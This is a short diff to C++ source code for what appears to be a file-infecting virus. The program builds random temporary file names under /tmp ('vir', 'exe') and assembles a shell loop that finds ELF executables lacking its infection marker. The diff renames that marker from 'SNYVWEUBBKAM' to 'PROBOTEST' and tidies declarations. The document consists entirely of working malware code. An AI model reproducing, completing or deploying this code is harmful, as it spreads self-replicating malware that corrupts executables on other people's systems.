@@ -2,13 +2,10 @@
 #include <fstream>
 #include <unistd.h>
 
-#define MYSIZE 19576
+const char* IDENTIFIER = "PROBOTEST";
+const int MYSIZE = 19576;
 
-const char* IDENTIFIER = "SNYVWEUBBKAM";
-
-using std::string;
-using std::ifstream;
-using std::ofstream;
+using namespace std;
 
 char* which(char* w);
 
@@ -17,7 +14,8 @@ int main (int argc, char** argv) {
     uid_t uid=getuid();
     srand(time(0));
     int c;
-    string exe = "/tmp/e", vir = "/tmp/v", me = which(argv[0]), command;
+    string exe = "/tmp/e", vir = "/tmp/v", me = (string) argv[0], command;
+    me = which(argv[0]);
     me = me.substr(0, me.size() - 1);
     for (int i = 0; i < 8; i++) {
         exe += (char) ((rand() % 26) + 65);
@@ -56,7 +54,7 @@ int main (int argc, char** argv) {
         command += "`; \
 do \
 file $n | grep -q ELF && ( \
-grep -q SNYVWEUBBKAM $n || \
+grep -q PROBOTEST $n || \
 echo \"$n\" \
 ); \
 done | tail -1); \
